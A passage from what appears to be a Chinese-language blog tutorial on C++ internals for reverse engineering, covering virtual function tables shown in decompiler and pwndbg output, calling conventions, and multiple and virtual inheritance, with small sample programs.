<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rbx</span></span><br><span class="line">  _QWORD *v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (_QWORD *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  *v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">sub_13B4</span>(v3, a2);</span><br><span class="line">  v5 = v3;</span><br><span class="line">  (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(_QWORD *))*v3)(v3);</span><br><span class="line">  (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(_QWORD *))(*v5 + <span class="number">8LL</span>))(v5);</span><br><span class="line">  (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(_QWORD *))(*v5 + <span class="number">16LL</span>))(v5);</span><br><span class="line">  (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(_QWORD *))(*v5 + <span class="number">24LL</span>))(v5);</span><br><span class="line">  (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(_QWORD *))(*v5 + <span class="number">32LL</span>))(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>查看虚表，里面装有各个虚函数的首地址：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D50 <span class="number">9</span>C <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_3D50 dq offset _ZN4Base4foo1Ev      ; DATA XREF: Base::Base(<span class="keyword">void</span>)+<span class="number">8</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D50                                                                       ; Base::foo1(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D58 D4 <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo2Ev               ; Base::foo2(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D60 <span class="number">0</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo3Ev               ; Base::foo3(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D68 <span class="number">44</span> <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo4Ev               ; Base::foo4(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D70 <span class="number">7</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo5Ev               ; Base::foo5(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>用 GDB 进行调试：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55883ca88000</span>+<span class="number">0x3D50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdx <span class="number">0x55883ca8bd50</span> —▸ <span class="number">0x55883ca8929c</span> (Base::foo1()) ◂— push   rbp</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x55883ca8bd58</span> —▸ <span class="number">0x55883ca892d4</span> (Base::foo2()) ◂— push   rbp</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x55883ca8bd60</span> —▸ <span class="number">0x55883ca8930c</span> (Base::foo3()) ◂— push   rbp</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x55883ca8bd68</span> —▸ <span class="number">0x55883ca89344</span> (Base::foo4()) ◂— push   rbp</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x55883ca8bd70</span> —▸ <span class="number">0x55883ca8937c</span> (Base::foo5()) ◂— push   rbp</span><br></pre></td></tr></table></figure>
<p>案例三：虚函数的继承</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo1() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo2() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo3() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> :</span> <span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fooa</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::fooa() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foob</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::fooa() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fooa</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::fooa() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foob</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::fooa() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    A *a = <span class="keyword">new</span> <span class="built_in">A</span>();</span><br><span class="line">    B *b = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">foo1</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foo2</span>();  </span><br><span class="line">    b-&gt;<span class="built_in">fooa</span>();  </span><br><span class="line">    b-&gt;<span class="built_in">foob</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">fooa</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foob</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当一个类继承带有虚函数的类时，它会先将父类的虚表复制一份，然后将自己的虚表添加到后面：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  A *v3; <span class="comment">// rbx</span></span><br><span class="line">  B *v4; <span class="comment">// rbx</span></span><br><span class="line">  A *a; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  B *b; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (A *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  v3-&gt;_vptr_Base = <span class="number">0LL</span>;</span><br><span class="line">  A::<span class="built_in">A</span>(v3);</span><br><span class="line">  a = v3;</span><br><span class="line">  v4 = (B *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  v4-&gt;_vptr_Base = <span class="number">0LL</span>;</span><br><span class="line">  B::<span class="built_in">B</span>(v4);</span><br><span class="line">  b = v4;</span><br><span class="line">  (*a-&gt;_vptr_Base)(a, argv);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(A *))a-&gt;_vptr_Base + <span class="number">1</span>))(a);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(B *))b-&gt;_vptr_Base + <span class="number">3</span>))(b);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(B *))b-&gt;_vptr_Base + <span class="number">4</span>))(b);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(A *))a-&gt;_vptr_Base + <span class="number">3</span>))(a);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(A *))a-&gt;_vptr_Base + <span class="number">4</span>))(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>查看虚表，里面装有各个虚函数的首地址：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D30 D4 <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_3D30 dq offset _ZN4Base4foo1Ev      ; DATA XREF: Base::Base(<span class="keyword">void</span>)+<span class="number">8</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D30                                                                       ; Base::foo1(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D38 <span class="number">0</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo2Ev               ; Base::foo2(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D40 <span class="number">44</span> <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo3Ev               ; Base::foo3(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CF8 D4 <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_3CF8 dq offset _ZN4Base4foo1Ev      ; DATA XREF: A::A(<span class="keyword">void</span>)+<span class="number">18</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CF8                                                                       ; Base::foo1(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D00 <span class="number">0</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo2Ev               ; Base::foo2(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D08 <span class="number">44</span> <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo3Ev               ; Base::foo3(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D10 <span class="number">7</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN1A4fooaEv                  ; A::fooa(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D18 B4 <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN1A4foobEv                  ; A::foob(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CC0 D4 <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_3CC0 dq offset _ZN4Base4foo1Ev      ; DATA XREF: B::B(<span class="keyword">void</span>)+<span class="number">18</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CC0                                                                       ; Base::foo1(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CC8 <span class="number">0</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo2Ev               ; Base::foo2(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CD0 <span class="number">44</span> <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo3Ev               ; Base::foo3(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CD8 EC <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN1B4fooaEv                  ; B::fooa(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CE0 <span class="number">24</span> <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN1B4foobEv                  ; B::foob(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>
<h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>C/C++ 函数调用约定，主要是对以下两个方面进行了约定： </p>
<ul>
<li>当参数个数多于一个时，按照什么顺序把参数压入堆栈（参数的入栈顺序）</li>
<li>函数调用后，由谁来把堆栈恢复原状</li>
</ul>
<p>常见的调用方式有：</p>
<ul>
<li>C 语言：<code>__cdecl __stdcall __fastcall naked __pascal</code></li>
<li>C++ 语言：<code>__cdecl __stdcall __fastcall naked __pascal __thiscall</code></li>
</ul>
<p>下面就分别介绍这几种调用方式： </p>
<p><code>__stdcall</code>：StandardCall 的缩写，是C++的标准调用方式</p>
<ul>
<li>使用 PASCAL 宏，WINAPI 宏和 CALLBACK 宏来指定函数的调用方式为 stdcall </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>; <span class="comment">// 明确指定用stdcall</span></span><br></pre></td></tr></table></figure>
<ul>
<li>参数从右向左依次压入堆栈</li>
<li>由被调用函数自己来恢复堆栈，称为自动清栈</li>
<li>函数名自动加前导下划线，后面紧跟着一个@，其后紧跟着参数的大小</li>
</ul>
<p><code>__cdecl</code>：C Declaration 的缩写，cdecl 调用方式又称为C调用方式，是32位C程序默认的调用方式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> <span class="comment">// 不加修饰符就是cdecl</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> _cdecl <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> <span class="comment">// 明确指定用cdecl</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>参数从右向左依次压入堆栈</li>
<li>由调用者恢复堆栈，称为手动清栈</li>
<li>函数名自动加前导下划线</li>
</ul>
<p><code>__fastcall</code>：一种快速调用方式（通过 CPU 寄存器来传递参数），是64位C程序默认的调用方式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> fastcall <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>; <span class="comment">// 明确指定用fastcall</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前6个参数分别放入 RDI，RSI，RDX，RCX，R8，R9</li>
<li>其余参数从右向左依次压入堆栈</li>
<li>如果需要用栈传参，则使用手动清栈</li>
</ul>
<p><code>__thiscall</code>：唯一一个不能明确指明的函数修饰，因为 thiscall 不是关键字，是C++类成员函数默认的调用约定</p>
<ul>
<li>由于成员函数调用还有一个 this 指针，因此必须特殊处理</li>
<li>this 指针将作为第一个参数传入，其余参数处理和 <code>__cdecl/__thiscall</code> 一样（取决于程序是32位还是64位）</li>
</ul>
<p><code>__stdcall</code> 和 <code>__cdecl</code> 的不同之处：</p>
<ul>
<li>stdcall 方式是在函数返回时利用 <code>retn x</code> 指令清除栈中的参数</li>
<li>cdecl 方式是函数返回后，由调用函数者修改 esp 的值来清除栈中的参数 </li>
</ul>
<h2 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h2><p>一个派生类如果只继承一个基类，称作单继承，那么如果继承了多个基类，就称作多继承</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span><span class="keyword">public</span> A,<span class="keyword">public</span> B&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/11/20/Cpp%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86+%E5%BA%95%E5%B1%82%E9%80%86%E5%90%91/1685892862095.png" alt="1685892862095">  </p>
<ul>
<li>优点：派生类通过多重继承，可以得到多个基类的数据和方法，更大程度的实现了代码复用</li>
<li>缺点：可能会导致某个类被重复构造，可能得到重复的基类数据</li>
</ul>
<p>案例：多重继承导致重复基类</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">A</span>(<span class="keyword">int</span> data):<span class="built_in">ma</span>(data)&#123; cout &lt;&lt; <span class="string">&quot;A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">A</span>()&#123; cout &lt;&lt; <span class="string">&quot;~A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> ma;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span><span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">B</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">mb</span>(data+<span class="number">1</span>) &#123; cout &lt;&lt; <span class="string">&quot;B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">B</span>()&#123; cout &lt;&lt; <span class="string">&quot;~B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mb;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span><span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">C</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">mc</span>(data+<span class="number">2</span>) &#123; cout &lt;&lt; <span class="string">&quot;C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">C</span>()&#123; cout &lt;&lt; <span class="string">&quot;~C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mc;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> :</span><span class="keyword">public</span> B, <span class="keyword">public</span> C&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">D</span>(<span class="keyword">int</span> data):<span class="built_in">B</span>(data),<span class="built_in">C</span>(data),<span class="built_in">md</span>(data+<span class="number">3</span>) &#123; cout &lt;&lt; <span class="string">&quot;D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">D</span>()&#123; cout &lt;&lt; <span class="string">&quot;~D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> md;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    D* a = <span class="keyword">new</span> <span class="built_in">D</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A()</span><br><span class="line">B()</span><br><span class="line">A()</span><br><span class="line">C()</span><br><span class="line">D()</span><br></pre></td></tr></table></figure>
<ul>
<li>A被构造了两次</li>
</ul>
<h2 id="虚继承"><a href="#虚继承" class="headerlink" title="虚继承"></a>虚继承</h2><p>在继承方式前面加上 virtual 关键字就是虚继承</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">virtual</span> <span class="keyword">public</span> A&#123;&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果虚继承类拥有派生类，则构造虚基类的任务将会交给派生类完成</li>
</ul>
<p>案例：虚继承解决重复基类的问题</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">A</span>(<span class="keyword">int</span> data):<span class="built_in">ma</span>(data)&#123; cout &lt;&lt; <span class="string">&quot;A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">A</span>()&#123; cout &lt;&lt; <span class="string">&quot;~A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> ma;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span><span class="keyword">virtual</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">B</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">mb</span>(data+<span class="number">1</span>) &#123; cout &lt;&lt; <span class="string">&quot;B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span 